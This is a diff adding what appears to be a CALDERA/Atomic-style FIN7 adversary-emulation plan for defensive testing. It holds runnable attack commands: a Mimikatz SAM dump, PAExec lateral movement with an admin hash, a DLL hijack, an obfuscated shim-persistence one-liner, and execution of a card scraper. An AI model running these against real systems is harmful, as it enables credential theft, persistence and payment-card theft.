@@ -1,0 +1,322 @@
+# Fin7.yaml - CALDERA and Atomic Style TTPS
+
+- emulation_plan_details:
+    id: c30763a7-172c-431e-a877-b18aecf9292a
+    adversary_name: FIN7
+    adversary_description: FIN7 is a threat group attributed
+    attack_version: 8.1
+    format_version: 1.0
+
+# Step 1 - Initial Access - skipped, requires user interaction
+
+# Step 2 - Delayed Malware Execution
+
+  # 2.A - SQLRat Execution via Scheduled Task - skipped, requires interaction with agent through external C2 server
+
+  # 2.B - Upload Powershell Stager - skipped, requires interaction with agent through external C2 server
+
+# Step 3 - Target Assessment
+
+  # 3.A - Local Discovery - skipped, requires interaction with agent through external C2 server
+
+- id: eac2cf0f-7b51-44d2-83cb-57a34a29b7ff
+  name: Screenshot of end-users desktop
+  description: Take screenshots of end user's endpoint.
+  tactic: Collection
+  technique:
+    attack_id: T1113
+    name: Screen Capture
+  cti_source: "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/"
+  procedure_group: procedure_collection
+  procedure_step: "3.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\takeScreenshot.ps1
+
+  input_arguments:
+    domain:
+      description: The name of the target domain
+      type: string
+      default: hospitality
+    domain.admin.username:
+      description: The username of the domain administrator
+      type: string
+      default: kmitnick
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\takeScreenshot.ps1
+
+# Step 4 - Staging Interactive Toolkit
+
+- id: 82d2f5c7-7561-4d91-96d2-959473b9ad2b
+  name: Execution of stager.ps1
+  description: Execution of previously placed stager.
+  tactic: Execution
+  technique:
+    attack_id: T1059.003
+    name: Command and Scripting Interpreter - Windows Command Shell
+  cti_source: "https://blog.morphisec.com/fin7-attacks-restaurant-industry"
+  procedure_group: procedure_execution
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\stager.ps1"
+        payloads:
+        - stager.ps1
+
+  input_arguments:
+    domain:
+      description: The name of the target domain
+      type: string
+      default: hospitality
+    domain.admin.username:
+      description: The username of the domain administrator
+      type: string
+      default: kmitnick
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\stager.ps1"
+
+# Step 5 - Escalate Privileges
+
+- id: ab937ef4-7c66-4349-ad3b-658c41fcf4c5
+  name: Enumerate
+  description: Perform process discovery (T1057)
+  tactic: Discovery/Execution
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "5.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -c "ps"
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -c "ps"
+
+- id: b15d3014-a5d1-4ec6-934b-d7fe44451192
+  name: Execute SAMCats (Mimikatz)
+  description: Dump SAM via Mimikatz(T1003.002)
+  tactic: OS Credential Dumping
+  technique:
+    attack_id: T1003.002
+    name: "OS Credential Dumping: Security Account Manager"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "5.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -ExecutionPolicy Bypass -NoExit -File "C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1"
+        payloads:
+        - uac-samcats.ps1
+        - samcat.exe
+
+  input_arguments:
+    domain:
+      description: The name of the target domain
+      type: string
+      default: hospitality
+    domain.admin.username:
+      description: The username of the domain administrator
+      type: string
+      default: kmitnick
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -ExecutionPolicy Bypass -NoExit -File "C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1"
+
+# Step 6 - Expand Access
+
+- id: 9a76889c-9518-4b3e-9c87-6618156015c6
+  name: Expand Access to itadmin
+  description: Leverage PAExec to laterally move and execute on itadmin
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c ".\paexec.exe \\#{itadmin.ip.address} -s -u #{domain}\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \".\hollow.exe\" hollow.exe"
+        payloads:
+        - hollow.exe
+        - paexec.exe
+
+  input_arguments:
+    domain:
+      description: The name of the target domain
+      type: string
+      default: hospitality
+    domain.admin.username:
+      description: The username of the domain administrator
+      type: string
+      default: kmitnick
+    domain.admin.hash:
+      description: The password hash of the domain administrator
+      type: string
+      default: c3aa78cd0827b8e8603ac1c8996e6556
+    itadmin.ip.address:
+      description: The IP address of the itadmin workstation
+      type: string
+      default: 10.0.1.6
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c ".\paexec.exe \\#{itadmin.ip.address} -s -u #{domain}\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \".\hollow.exe\" hollow.exe"
+
+# Step 7 - Setup User Monitoring
+
+- id: ab48e12f-def0-40a4-b3d9-ad958f45202a
+  name: Privilege Escalation
+  description: Perform DLL hijack to escalate privileges.
+  tactic: Hijack Execution Flow - DLL Search Order Hijacking
+  technique:
+    attack_id: T1574.001
+    name: Hijack Execution Flow - DLL Search Order Hijacking
+  cti_source: "https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html"
+  procedure_group: procedure_priv_escalation
+  procedure_step: "7.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
+          cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
+        payloads:
+        - BOOSTWRITE.dll
+
+  executors:
+  - name: powershell
+    command: |
+      robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
+      cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
+
+# Step 8 - User Monitoring - skipped, requires Metasploit's screen_spy module
+
+# Step 9 - Setup Shim Persistence
+
+  # 9.A - Pivot to Accounting - skipped, requires Metasploit's portfwd feature
+
+- id: eb99abcb-93e2-4a3e-bf05-a484839dc851
+  name: Setup Application Shim Persistence
+  description: Execute PowerShell oneliner to install application shim.
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html"
+  procedure_group: procedure_def_evasion
+  procedure_step: "9.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -noprofile -encodedCommand "JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA=="
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -noprofile -encodedCommand "JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA=="
+
+# Step 10 - Steal Payment Data
+
+- id: 6ec6561b-e535-4fe3-9c20-a52e5982b513
+  name: Execute Application Shim Persistence
+  description: Reboot the host to start shim persistence.
+  tactic: Persistence
+  technique:
+    attack_id: T1546.011
+    name: Application Shimming
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html"
+  procedure_group: procedure_persistence
+  procedure_step: "10.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -c "restart-computer -force"
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -c "restart-computer -force"
+
+- id: d04a02e1-a05c-46f8-adf0-c036266fe0a1
+  name: Execute PillowMint Credit Card Scraper
+  description: Upload and execute the PillowMint credit card scraper as debug.exe
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "10.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item pillowMint.exe debug.exe;
+          .\debug.exe;
+        payloads:
+        - pillowMint.exe
+        cleanup: |
+          Remove-Item -Force debug.exe;
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item pillowMint.exe debug.exe;
+      .\debug.exe;
+    cleanup_command: |
+      Remove-Item -Force debug.exe;
+
+- id: 89b84389-036e-4c3d-a490-bf8ba50bffe8
+  name: Archive Credit Card Data
+  description: Compress credit card data into an archive using 7za.exe
+  tactic: exfiltration
+  technique:
+    attack_id: T1560.001
+    name: "Archive Collected Data: Archive via Utility"
+  cti_source: "https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/"
+  procedure_group: procedure_exfiltration
+  procedure_step: "10.B.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          .\7za.exe a log log.txt;
+        payloads:
+        - 7za.exe
+        cleanup: |
+          Remove-Item -Force log.7z;
+
+  executors:
+  - name: powershell
+    command: |
+      .\7za.exe a log log.txt;
+    cleanup_command: |
+      Remove-Item -Force log.7z;
+
+  # 10.B.3 - Exfiltrate Compressed Credit Card Info - skipped, skipped, requires interaction with RAt through external C2 server
